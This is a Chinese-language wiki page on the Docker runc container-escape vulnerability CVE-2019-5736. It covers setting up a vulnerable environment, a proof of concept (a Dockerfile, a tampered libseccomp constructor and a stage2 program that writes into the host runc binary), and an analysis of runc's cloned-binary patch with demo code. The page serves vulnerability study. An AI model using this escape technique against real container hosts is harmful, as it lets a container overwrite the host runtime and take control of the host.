<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <link rel="shortcut icon" href="../../img/favicon.ico">
  <title>Cve 2019 5736 附件 - expwiki</title>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="../../css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../css/theme_extra.css" type="text/css" />
  <link rel="stylesheet" href="../../css/highlight.css">
  
  <script>
    // Current page data
    var mkdocs_page_name = "Cve 2019 5736 \u9644\u4ef6";
    var mkdocs_page_input_path = "userspace/cve-2019-5736-\u9644\u4ef6.md";
    var mkdocs_page_url = "/userspace/cve-2019-5736-\u9644\u4ef6/";
  </script>
  
  <script src="../../js/jquery-2.1.1.min.js"></script>
  <script src="../../js/modernizr-2.8.3.min.js"></script>
  <script type="text/javascript" src="../../js/highlight.pack.js"></script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
      <div class="wy-side-nav-search">
        <a href="../.." class="icon icon-home"> expwiki</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
	<ul class="current">
	  
          
            <li class="toctree-l1">
		
    <a class="" href="../..">前言</a>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">linux用户态漏洞</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../cve-2018-1000001-分析/">Cve 2018 1000001 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2018-1000001-附件/">Cve 2018 1000001 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-12735-分析/">Cve 2019 12735 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-12735-附件/">Cve 2019 12735 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-5736-分析/">Cve 2019 5736 分析</a>
                </li>
                <li class=" current">
                    
    <a class="current" href="./">Cve 2019 5736 附件</a>
    <ul class="subnav">
            
    <li class="toctree-l3"><a href="#docker-runccve-2019-5736">Docker runc容器逃逸漏洞分析附件(CVE-2019-5736)</a></li>
    
        <ul>
        
            <li><a class="toctree-l4" href="#_1">基础知识</a></li>
        
            <li><a class="toctree-l4" href="#_2">环境搭建</a></li>
        
            <li><a class="toctree-l4" href="#poc">复现环境PoC</a></li>
        
            <li><a class="toctree-l4" href="#_4">补丁分析</a></li>
        
        </ul>
    

    </ul>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">linux内核态漏洞</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../../kernel/cve-2018-18281-分析/">Cve 2018 18281 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2018-18281-附件/">Cve 2018 18281 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2019-13272-分析/">Cve 2019 13272 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2019-13272-附件/">Cve 2019 13272 附件</a>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../../acknowledgements/">致谢</a>
	    </li>
          
        </ul>
      </div>
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="../..">expwiki</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../..">Docs</a> &raquo;</li>
    
      
        
          <li>linux用户态漏洞 &raquo;</li>
        
      
    
    <li>Cve 2019 5736 附件</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="docker-runccve-2019-5736">Docker runc容器逃逸漏洞分析附件(CVE-2019-5736)</h1>
<h2 id="_1">基础知识</h2>
<p>Docker</p>
<p><a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a>
<a href="https://docs.docker.com/engine/reference/run/">https://docs.docker.com/engine/reference/run/</a>
<a href="https://docs.docker.com/engine/reference/commandline/exec/">https://docs.docker.com/engine/reference/commandline/exec/</a></p>
<p>Dockerfile</p>
<p><a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a>
<a href="https://docs.docker.com/engine/reference/builder/#from">https://docs.docker.com/engine/reference/builder/#from</a>
<a href="https://docs.docker.com/engine/reference/builder/#run">https://docs.docker.com/engine/reference/builder/#run</a>
<a href="https://docs.docker.com/engine/reference/builder/#add">https://docs.docker.com/engine/reference/builder/#add</a>
<a href="https://docs.docker.com/engine/reference/builder/#entrypoint">https://docs.docker.com/engine/reference/builder/#entrypoint</a></p>
<p>Linux Namespace<br />
Mount namespace<br />
setns<br />
mount REMOUNT<br />
seal<br />
Linux Control Group<br />
libseccomp  </p>
<h2 id="_2">环境搭建</h2>
<h4 id="_3">虚拟机安装</h4>
<p>系统镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso">https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso</a></p>
<pre><code>#  创建虚拟机硬盘
$ qemu-img create -f qcow2 ubuntu18.04.4.img 10G

# 安装虚拟机
$ qemu-system-x86_64  -m 2048 -hda ubuntu18.04.4.img -cdrom ./ubuntu-18.04.4-desktop-amd64.iso

# 启动虚拟机
$ qemu-system-x86_64 -m 2048  ubuntu18.04.4.img
</code></pre>

<h5 id="docker">Docker安装</h5>
<p>使用Ubunt的发行版本的packeg: docker-io ( Docker官方仓库的packges: docker-ce, docker-ce-cli, container.io 漏洞已经修复)</p>
<p>查看可安装版本:</p>
<pre><code>$ apt-cache policy docker.io
docker.io:
  Installed: 17.12.1-0ubuntu1
  Candidate: 19.03.6-0ubuntu1~18.04.1
  Version table:
     19.03.6-0ubuntu1~18.04.1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-updates/universe amd64 Packages
     18.09.7-0ubuntu1~18.04.4 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security/universe amd64 Packages
 *** 17.12.1-0ubuntu1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic/universe amd64 Packages
        100 /var/lib/dpkg/status
</code></pre>

<p>查看docker.io的changelog:</p>
<pre><code>$ PAGER=cat apt-get -q=2 changelog docker.io 
...
docker.io (18.09.2-0ubuntu1) disco; urgency=medium

  * Update to 18.09.2, including fix for CVE-2019-5736.
    - Convert components/engine/git-bundles/CVE-2019-5736.bundle into
      d/patches/0001-nsenter-clone-proc-self-exe-to-avoid-exposing-host-b.patch.
    - Hard code RUNC_COMMIT in d/rules for now.

 -- Michael Hudson-Doyle &lt;michael.hudson@ubuntu.com&gt;  Tue, 12 Feb 2019 10:55:11 +1300

...
</code></pre>

<p>在<a href="https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/docker.io_17.12.1-0ubuntu1_amd64.deb.html">官网</a>下载低版本<a href="http://archive.ubuntu.com/ubuntu/pool/universe/d/docker.io/docker.io_17.12.1-0ubuntu1_amd64.deb">package</a>，或者<a href="https://pan.baidu.com/s/1PO4OV_el6fQ0xgymF8FsXg">百度云</a> 密码:q9vg，下载后安装：</p>
<pre><code>$ sudo dpkg -i docker.io_17.12.1-0ubuntu1_amd64.deb
...

$ docker --version
Docker version 17.12.1-ce, build 7390fc6

$ docker-runc --version
runc version 1.0.0-rc4+dev
commit: 9f9c96235cc97674e935002fc3d78361b696a69e
spec: 1.0.0
</code></pre>

<p>或者直接apt-get安装(如果还有的话)：</p>
<pre><code>$ sudo apt-get install docker.io=17.12.1-0ubuntu1
</code></pre>

<h2 id="poc">复现环境PoC</h2>
<p>链接:<a href="https://pan.baidu.com/s/16NAGxsRR0cs2NPf9d0Qw_g">https://pan.baidu.com/s/16NAGxsRR0cs2NPf9d0Qw_g</a>  密码:np1j</p>
<pre><code>$ tree
.
├── Dockerfile
├── README
├── stage1.c
└── stage2.c

0 directories, 4 files
</code></pre>

<pre><code>$ cat Dockerfile
FROM ubuntu:18.04
# 继承ubuntu:18.04 image
RUN set -e -x ;\
    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
    apt -y update ;\
    apt-get -y install build-essential ;\
    cd /root ;\
    apt-get -y build-dep libseccomp ;\
    apt-get source libseccomp
    
ADD stage1.c /root/stage1.c
RUN set -e -x ;\
    cd /root/libseccomp-2.4.1 ;\
    cat /root/stage1.c &gt;&gt; src/api.c ;\
    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
    dpkg -i /root/*.deb
# libseccomp不知做什么的，貌似是docker的依赖包
# 原Poc这里是libseccomp-2.3.1, 但是apt-get source libseccomp会安装最新的版本，所以这个版本号需要修改
# 这几步是下载libseccomp的源码包，修改源码的src/api.c文件，追加写入了stage1.c的内容后，将libseccomp构建成dep包并安装

ADD stage2.c /root/stage2.c
RUN set -e -x ;\
    cd /root ;\
    gcc stage2.c -o /stage2
# 编译stage2.c，等待被stage1加载并执行

ENTRYPOINT [ &quot;/entrypoint&quot; ]


RUN set -e -x ;\
    ln -s /proc/self/exe /entrypoint
</code></pre>

<pre><code>$ cat stage1.

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;


__attribute__ ((constructor)) void foo(void)
{
    int fd = open(&quot;/proc/self/exe&quot;, O_RDONLY);
    if (fd == -1 ) {
        printf(&quot;HAX: can't open /proc/self/exe\n&quot;);
        return;
    }
    printf(&quot;HAX: fd is %d\n&quot;, fd);
    char *argv2[3];
    argv2[0] = strdup(&quot;/stage2&quot;);
    char buf[128];
    snprintf(buf, 128, &quot;/proc/self/fd/%d&quot;, fd);
    argv2[1] = buf;
    argv2[2] = 0;
    execve(&quot;/stage2&quot;, argv2, NULL);
}


/*


__attribute__ ((constructor))
The constructor attribute causes the function to be called automatically before execution enters main (). 


只读方式打开当前进程的可执行文件
初始化argv2[0] 为 /stage2
初始化argv2[1] 为 /proc/self/fd/[/proc/self/exe -&gt; fd]
       /proc/[pid]/fd/
         This is a subdirectory containing one entry for each file
         which the process has open, named by its file descriptor, and
              which is a symbolic link to the actual file.  
              Thus, 0 is standard input, 1 standard output, 
              2 standard error, and so on.
初始化argv2[2] 为 0
execve执行子进程/stage2 参数为argv2
*/
</code></pre>

<pre><code>$ cat stage2.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;


int main(int argc, char **argv) {
    printf(&quot;HAX2: argv: %s\n&quot;, argv[1]);
    int fd = open(argv[1], O_RDWR|O_APPEND);
    printf(&quot;HAX2: fd: %d\n&quot;, fd);

    const char *poc = &quot;cve-2019-5736&quot;;
    int res = write(fd, poc, strlen(poc));
    printf(&quot;HAX2: res: %d, %d\n&quot;, res, errno);
}

/*
根据stage1传入的/proc/self/exe路径， 将poc追加写入该文件末尾，即docker-runc
证明了docker-runc可以被容器内的应用修改
*/
</code></pre>

<h2 id="_4">补丁分析</h2>
<h4 id="_5">补丁概述</h4>
<p>简单总结就是：通过某种方式clone一个runc的/proc/self/exe的只读副本，该副本是一个只读的内存文件，然后重新执行clone出的内存文件，从而使runc进程的proc符号链接(/proc/self/exe)对应的是该内存文件副本。</p>
<p>为了修复这个漏洞，在runc源码libcontainer/nsenter/nsexec.c 文件的nsexec函数中增加了一个ensure_cloned_binary函数调用：</p>
<pre><code>if (ensure_cloned_binary() &lt; 0)
        bail(&quot;could not ensure we are a cloned binary&quot;);
</code></pre>

<p>它的实现在文件libcontainer/nsenter/cloned_binary.c 中：</p>
<pre><code>int ensure_cloned_binary(void)
{
   int execfd;
   ...
   int cloned = is_self_cloned();

   if (cloned &gt; 0 || cloned == -ENOTRECOVERABLE)
     return cloned;
   ...
   execfd = clone_binary();
   ...
   fexecve(execfd, argv, environ);
   ...
}

</code></pre>

<ul>
<li>ensure_cloned_binary函数首先通过is_self_cloned函数判断当前进程的可执行文件是否是cloned(这里的clone可以理解成复制文件，而不是clone一个子进程的那个clone)；</li>
<li>如果runc是第一次被执行，则会返回false，然后通过clone_binary函数复制/proc/self/exe文件；</li>
<li>最后通过fexecve重新启动当前进程，对应的可执行文件是复制后的文件；</li>
<li>下一次执行的时候，is_self_cloned函数会返回true，然后进入打补丁前的正常流程。</li>
</ul>
<h4 id="package-nsenter">package nsenter</h4>
<p>package nsenter是做什么的？</p>
<pre><code>$ cat README.md
The `nsenter` package registers a special init constructor that is called before the Go runtime has a chance to boot.  
This provides us the ability to `setns` on existing namespaces 
and avoid the issues that the Go runtime has with multiple 
threads.  
This constructor will be called if this package is registered, 
imported, in your go application.
</code></pre>

<ul>
<li>对于Mount Namespace来说，一个具有多线程的进程是无法使用setns调用进入到对应的命名空间( the Go runtime has with multiple threads )。</li>
<li>所以通过CGO(CGO介绍见下文)在Go runtime 启动之前，执行一个构造函数也就是nsexec.c中的nsexec函数来进行setns操作。</li>
<li>这个构造函数会在nsenter package 被导入的时候执行。</li>
</ul>
<p>具体实现：</p>
<p>在runc的main packege的源码文件init.go中，导入了package nsenter </p>
<pre><code>package main
import (
...
   _ &quot;github.com/opencontainers/runc/libcontainer/nsenter&quot;
...
)
</code></pre>

<p>package nsenter的主要内容</p>
<pre><code>$ pwd
.../runc-master/libcontainer/nsenter
$ tree
.
├── README.md
├── cloned_binary.c
├── namespace.h
├── nsenter.go
├── nsenter_gccgo.go
├── nsenter_test.go
├── nsenter_unsupported.go
└── nsexec.c
0 directories, 8 files
</code></pre>

<pre><code>$ cat nsenter.go
// +build linux,!gccgo
package nsenter
/*
#cgo CFLAGS: -Wall
extern void nsexec();
void __attribute__((constructor)) init(void) {
    nsexec();
}
*/
import &quot;C&quot;
</code></pre>

<p>这里用到了CGO：</p>
<pre><code>$ cat README.md
...
The `nsenter` package will `import &quot;C&quot;` and it uses [cgo](https://golang.org/cmd/cgo/) package. 
In cgo, if the import of &quot;C&quot; is immediately preceded by a comment, that comment, called the preamble, is used as a header when compiling the C parts of the package.
...
</code></pre>

<p>CGO简单说就是: 通过go调用C语言代码，语法是 import "C"语句+前面的注释(称为preamble)，preamble部分就是C语言代码(当C代码在不同文件时，preamble可以只写头文件引用)。
具体参考：</p>
<p><a href="https://golang.org/cmd/cgo/">https://golang.org/cmd/cgo/</a><br />
<a href="https://bastengao.com/blog/2017/12/go-cgo-c.html">https://bastengao.com/blog/2017/12/go-cgo-c.html</a></p>
<p>上面的代码差不多是这样的效果：</p>
<pre><code>$ tree
.
├── cgo_c.c
└── cgo_example.go
0 directories, 2 files
$ cat cgo_c.c
#include &lt;stdio.h&gt;
void c_func1(){
    printf(&quot;Hello, CGO!\n&quot;);
}
void c_func2(){
    printf(&quot;Goodbye, CGO!\n&quot;);
}
$ cat cgo_example.go
package main
/*
extern void c_func1();
extern void c_func2();
void __attribute__((constructor)) init(void) {
    c_func1();
}
*/
import &quot;C&quot;
func main(){
    C.c_func2()
}
$ go build -o cgo
$ ./cgo
Hello, CGO!
Goodbye, CGO!
</code></pre>

<p>关于<strong>attribute</strong>((constructor)):</p>
<p>一个面向gcc的语法，功能是设置一个在main函数执行前执行的构造函数。</p>
<h4 id="nsexecc">nsexec.c</h4>
<p>大致功能：先执行clone()，参数有CLONE_PARENT及命名空间参数，使子进程和父进程是兄弟关系，并拥有自己的命名空间。</p>
<p>然后调用setns()加入存在的namespace。</p>
<pre><code>/* A dummy function that just jumps to the given jumpval. */
static int child_func(void *arg) __attribute__ ((noinline));
static int child_func(void *arg)
{
   struct clone_t *ca = (struct clone_t *)arg;
   longjmp(*ca-&gt;env, ca-&gt;jmpval);
}
static int clone_parent(jmp_buf *env, int jmpval) __attribute__ ((noinline));
static int clone_parent(jmp_buf *env, int jmpval)
{
   struct clone_t ca = {
      .env = env,
      .jmpval = jmpval,
   };
   return clone(child_func, ca.stack_ptr, CLONE_PARENT | SIGCHLD, &amp;ca);
}
</code></pre>

<p>补丁是在这些步骤之前增加了ensure_cloned_binary函数的调用。</p>
<h4 id="ensure_cloned_binary-is_self_cloned">ensure_cloned_binary-&gt;is_self_cloned</h4>
<p>is_self_cloned是如何判断当前文件是否是clone过的？
...</p>
<h4 id="ensure_cloned_binary-clone_binary">ensure_cloned_binary-&gt;clone_binary</h4>
<p>clone_binary是如何实现的？作用是什么？</p>
<p>尝试通过两种方式来创建一个只读的，大小不可改变的临时内存文件，作为runc可执行文件的clone。</p>
<p>第一种方式是通过bind mount，见try_bindfd部分</p>
<pre><code>static int clone_binary(void)
{
    ...
    /*
     * Before we resort to copying, let's try creating an ro-binfd in one shot
     * by getting a handle for a read-only bind-mount of the execfd.
     */
  
    execfd = try_bindfd();
    if (execfd &gt;= 0)
        return execfd;
    ...
</code></pre>

<p>第二种方式: 当try_bindfd失败的时候通过make_execfd和seal_execfd来实现clone方案。</p>
<p>通过make_exec来创建一个内存文件，拷贝/proc/self/exe的数据后，通过seal_execfd对该内存文件设置限制使其只读。效果就是创建了一个只存在于内存中的/proc/self/exe的只读的clone文件。</p>
<pre><code>    /*
     * Dammit, that didn't work -- time to copy the binary to a safe place we
     * can seal the contents.
     */
    execfd = make_execfd(&amp;fdtype);
    ...
    binfd = open(&quot;/proc/self/exe&quot;, O_RDONLY | O_CLOEXEC);
    ...
    fstat(binfd, &amp;statbuf) 
    ...
    while (sent &lt; statbuf.st_size) {
        int n = sendfile(execfd, binfd, NULL, statbuf.st_size - sent);
        ...
        sent += n;
    }
    close(binfd);
    ...
    seal_execfd(&amp;execfd, fdtype)
    ...
    return execfd;
    ...
</code></pre>

<h5 id="clone_binary-try_bindfd">clone_binary-&gt;try_bindfd</h5>
<p>尝试将/proc/self/exe通过bind mount的方式bind到一个临时文件/tmp/runc.xxxxxx</p>
<pre><code>static int try_bindfd(void)
{
  ...
  fd = mkstemp(template);
  ...   
  ret = -EPERM;
  if (mount(&quot;/proc/self/exe&quot;, template, &quot;&quot;, MS_BIND, &quot;&quot;) &lt; 0)
        goto out;
  
  ...
  if (mount(&quot;&quot;, template, &quot;&quot;, MS_REMOUNT | MS_BIND | MS_RDONLY, &quot;&quot;) &lt; 0)
        goto out_umount;
  
  ...
  ret = open(template, O_PATH | O_CLOEXEC);
out_umount:
    ...
    if (umount2(template, MNT_DETACH) &lt; 0) {
        if (ret &gt;= 0)
            close(ret);
        ret = -ENOTRECOVERABLE;
    }
  
out:
    ...
    unlink(template);
    return ret;
}
  
</code></pre>

<p>一个测试Demo:</p>
<pre><code>#define _GNU_SOURCE
#include &lt;sys/mount.h&gt;
#include &lt;time.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;   
#include &lt;sys/stat.h&gt;    
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
int main(){
    char template[1024] = &quot;./target.XXXXXX&quot;;
    int fd = mkstemp(template);
    printf(&quot;%d\n&quot;, fd);
    mount(&quot;/proc/self/exe&quot;, template, &quot;&quot;, MS_BIND, &quot;&quot;) ;
    mount(&quot;&quot;, template, &quot;&quot;, MS_REMOUNT | MS_BIND | MS_RDONLY, &quot;&quot;);
    int ret = open(template, O_PATH | O_CLOEXEC);
    printf(&quot;%d\n&quot;, ret);
    sleep(20);
    umount2(template, MNT_DETACH);
    printf(&quot;umounted\n&quot;);
    sleep(1000);
}

/*
$ sudo ./mount_umount_demo 
3
4

$ ls -l
...
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo
-rw-r--r-- 1 invincible invincible  551 Apr 14 20:39 mount_umount_demo.c
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 target.xIAgUt

$ sudo ./mount_umount_demo 
3
4
umounted

$ ls -l
...
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo
-rw-r--r-- 1 invincible invincible  551 Apr 14 20:39 mount_umount_demo.c
-rw------- 1 root       root          0 Apr 14 20:40 target.xIAgUt
invincible@ubuntu:~/Desktop/test/mount_test$ 
*/
</code></pre>

<h5 id="clone_binary-make_execfd">clone_binary-&gt;make_execfd</h5>
<p>这个方案中make_execfd创建内存文件也有三种方式：</p>
<ul>
<li>通过memfd_create</li>
</ul>
<pre><code>#define RUNC_MEMFD_COMMENT &quot;runc_cloned:/proc/self/exe&quot;
#ifndef MFD_CLOEXEC
#  define MFD_CLOEXEC       0x0001U
#  define MFD_ALLOW_SEALING 0x0002U
#endif
static int make_execfd(int *fdtype)
{
    *fdtype = EFD_MEMFD;

    fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);

    if (fd &gt;= 0)
        return fd;
</code></pre>

<p>关于memfd_create：</p>
<pre><code>memfd_create() creates an anonymous file and returns a file
descriptor that refers to it.  The file behaves like a regular file,
and so can be modified, truncated, memory-mapped, and so on.
However, unlike a regular file, it lives in RAM and has a volatile
backing storage.
</code></pre>

<p>参考： <a href="https://cloud.tencent.com/developer/article/1551288">https://cloud.tencent.com/developer/article/1551288</a></p>
<ul>
<li>通过open 设置O_TMPFILE flag的方式创建临时文件</li>
</ul>
<pre><code>    *fdtype = EFD_FILE;
    fd = open(prefix, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);
    if (fstat(fd, &amp;statbuf) &gt;= 0)
    working_otmpfile = (statbuf.st_nlink == 0);
    if (working_otmpfile)
      return fd;
</code></pre>

<p>关于open函数的O_TMPFILE标志：</p>
<pre><code>O_TMPFILE (since Linux 3.11)
    Create an unnamed temporary regular file.  The pathname argu‐
    ment specifies a directory; an unnamed inode will be created
    in that directory's filesystem.  Anything written to the
    resulting file will be lost when the last file descriptor is
    closed, unless the file is given a name.
</code></pre>

<ul>
<li>通过mkostemp+unlink</li>
</ul>
<pre><code>    /*
     * Our final option is to create a temporary file the old-school way, and
     * then unlink it so that nothing else sees it by accident.
     */
    *fdtype = EFD_FILE;
    fd = mkostemp(template, O_CLOEXEC);
    if (fd &gt;= 0) {
        if (unlink(template) &gt;= 0)
            return fd;
</code></pre>

<p>关于mkostemp：
就是简单创建一个唯一名称的临时文件，并且可以使用跟open函数一样的部分flag</p>
<p>关于unlink:</p>
<pre><code>unlink() deletes a name from the filesystem.  If that name was the
last link to a file and no processes have the file open, the file is
deleted and the space it was using is made available for reuse.
</code></pre>

<h5 id="clone_binary-seal_execfd">clone_binary-&gt;seal_execfd</h5>
<ul>
<li>当make_execfd中通过memfd_create成功创建了内存文件时</li>
</ul>
<p>通过fcntl为文件添加seals，具体是该内存空间不可扩大和缩小，不可写入，</p>
<p>且该限制不可修改</p>
<pre><code>#ifndef F_SEAL_SEAL
#  define F_SEAL_SEAL   0x0001 /* prevent further seals from being set */
#  define F_SEAL_SHRINK 0x0002 /* prevent file from shrinking */
#  define F_SEAL_GROW   0x0004 /* prevent file from growing */
#  define F_SEAL_WRITE  0x0008 /* prevent writes */
#endif
#define RUNC_MEMFD_SEALS \
    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)
static int seal_execfd(int *fd, int fdtype)
{
    switch (fdtype) {
    case EFD_MEMFD:
        return fcntl(*fd, F_ADD_SEALS, RUNC_MEMFD_SEALS);
</code></pre>

<ul>
<li>如果是通过后两种方式创建的内存文件(open 设置O_TMPFILE或者mkostemp+unlink)</li>
</ul>
<p>会重新使用open设置O_PATH flag打开一次，这是为了让execve可用。</p>
<pre><code>    case EFD_FILE: {
        /* Need to re-open our pseudo-memfd as an O_PATH to avoid execve(2) giving -ETXTBSY. */
        int newfd;
        char fdpath[PATH_MAX] = {0};
        if (fchmod(*fd, 0100) &lt; 0)
            return -1;
        if (snprintf(fdpath, sizeof(fdpath), &quot;/proc/self/fd/%d&quot;, *fd) &lt; 0)
            return -1;
        newfd = open(fdpath, O_PATH | O_CLOEXEC);
        if (newfd &lt; 0)
            return -1;
        close(*fd);
        *fd = newfd;
        return 0;
    }
    default:
       break;
    }
    return -1;
}
</code></pre>

<p>关于open 的O_PATH flag：</p>
<pre><code>O_PATH (since Linux 2.6.39)
    ...
    One use of O_PATH for regular files is to provide the
    equivalent of POSIX.1's O_EXEC functionality.  This permits us
    to open a file for which we have execute permission but not
    read permission, and then execute that file, with steps
    something like the following:
    char buf[PATH_MAX];
    fd = open(&quot;some_prog&quot;, O_PATH);
    snprintf(buf, PATH_MAX, &quot;/proc/self/fd/%d&quot;, fd);
    execl(buf, &quot;some_prog&quot;, (char *) NULL);

    An O_PATH file descriptor can also be passed as the argument
    of fexecve(3).
</code></pre>

<p>demo1:</p>
<pre><code>//演示create_memfd + fexecve的方式
// 没有做异常处理
#define _GNU_SOURCE
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/sendfile.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/syscall.h&gt;
#define RUNC_MEMFD_COMMENT &quot;runc_cloned:/proc/self/exe&quot;
#ifndef F_SEAL_SEAL
#  define F_SEAL_SEAL   0x0001  /* prevent further seals from being set */
#  define F_SEAL_SHRINK 0x0002  /* prevent file from shrinking */
#  define F_SEAL_GROW   0x0004  /* prevent file from growing */
#  define F_SEAL_WRITE  0x0008  /* prevent writes */
#endif
#define RUNC_MEMFD_SEALS \
    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)

#ifndef F_LINUX_SPECIFIC_BASE
#  define F_LINUX_SPECIFIC_BASE 1024
#endif
#ifndef F_ADD_SEALS
#  define F_ADD_SEALS (F_LINUX_SPECIFIC_BASE + 9)
#  define F_GET_SEALS (F_LINUX_SPECIFIC_BASE + 10)
#endif

/* Use our own wrapper for memfd_create. */
#if !defined(SYS_memfd_create) &amp;&amp; defined(__NR_memfd_create)
#  define SYS_memfd_create __NR_memfd_create
#endif
/* memfd_create(2) flags -- copied from &lt;linux/memfd.h&gt;. */
#ifndef MFD_CLOEXEC
#  define MFD_CLOEXEC       0x0001U
#  define MFD_ALLOW_SEALING 0x0002U
#endif
int memfd_create(const char *name, unsigned int flags)
{
#ifdef SYS_memfd_create
    return syscall(SYS_memfd_create, name, flags);
#else
    errno = ENOSYS;
    return -1;
#endif
}

int main(int argc, char *argv[]){
    if(argc &gt; 1){
        if(strcmp(argv[1], &quot;stage2&quot;) == 0){ 
            printf(&quot;Stage 2 ok\n&quot;);
            return 0;
        }
        else{
            return -1;
        }
    }   
    // 通过memfd_create创建内存文件
    int fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);
    printf(&quot;%d\n&quot;, fd);
    // 把/proc/self/exe 复制到 memfd_create创建的内存文件
    int exefd = open(&quot;/proc/self/exe&quot;, O_RDONLY | O_CLOEXEC);
    size_t sent = 0;
    struct stat statbuf = {};
    fstat(exefd, &amp;statbuf);
    while (sent &lt; statbuf.st_size) {
        int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);
        sent += n;
    }
    close(exefd);
    printf(&quot;sent: %ldbytes\n&quot;, sent);
    // 添加seals约束    
    if(fcntl(fd, F_ADD_SEALS, RUNC_MEMFD_SEALS) &lt; 0){
        perror(&quot;fcntl error&quot;);
    }
    // 执行stage2
    char *env[] = {NULL};
    char *argv2[] = {&quot;&quot;, &quot;stage2&quot;, NULL};
    fexecve(fd, argv2, env);
    perror(&quot;fexecve error&quot;);
}
/*
$ gcc memfd_create_demo.c -o memfd
$ ./memfd 
3
sent: 9288bytes
Stage 2 ok
*/
</code></pre>

<p>demo2:</p>
<pre><code>// 演示open O_TEMPFILE + open O_PATH + fexecve的方式
// 没有做异常处理
#define _GNU_SOURCE
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
 #include &lt;sys/sendfile.h&gt;
int main(int argc, char *argv[]){
    if(argc &gt; 1){
        if(strcmp(argv[1], &quot;stage2&quot;) == 0){ 
            printf(&quot;Stage 2 ok\n&quot;);
            return 0;
        }
        else{
            return -1;
        }
    }
    struct stat statbuf = {};
    size_t sent = 0;
    char **environ;
    char *argv2[] = {&quot;opath&quot;, &quot;stage2&quot;, NULL};
    int fd = open(&quot;./&quot;, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);
    int exefd = open(&quot;/proc/self/exe&quot;, O_RDONLY | O_CLOEXEC);
    fstat(exefd, &amp;statbuf);
    while (sent &lt; statbuf.st_size) {
        int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);
        sent += n;
    }
    close(exefd);
    fchmod(fd, 0100);
    char fdpath[1024];
    snprintf(fdpath, sizeof(fdpath), &quot;/proc/self/fd/%d&quot;, fd);
